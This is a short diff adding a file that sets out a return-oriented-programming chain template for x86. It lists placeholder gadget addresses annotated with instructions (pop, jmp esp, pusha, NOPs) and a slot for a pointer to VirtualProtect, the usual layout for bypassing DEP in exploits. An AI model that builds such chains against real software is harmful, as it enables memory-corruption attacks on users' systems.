@@ -1,0 +1,15 @@
+10011111 | pop eax, ret
+90909090 | NOPS
+C0001111 | xor ebx, ret
+B0011111 | inc ebx, ret
+50001111 | push esp, ret
+30011111 | pop ecx, ret
+00000000 | Unable to find appropriate instruction. EDX must be allocated manually
+60011111 | pop ebp, ret
+90001111 | jmp esp, ret
+70011111 | pop esi, ret
+33331111 | Pointer to VirtualProtect.
+80011111 | pop edi, ret
+99991111 | ROP NOP
+90011111 | pusha, ret
+90001111 | jmp esp, ret
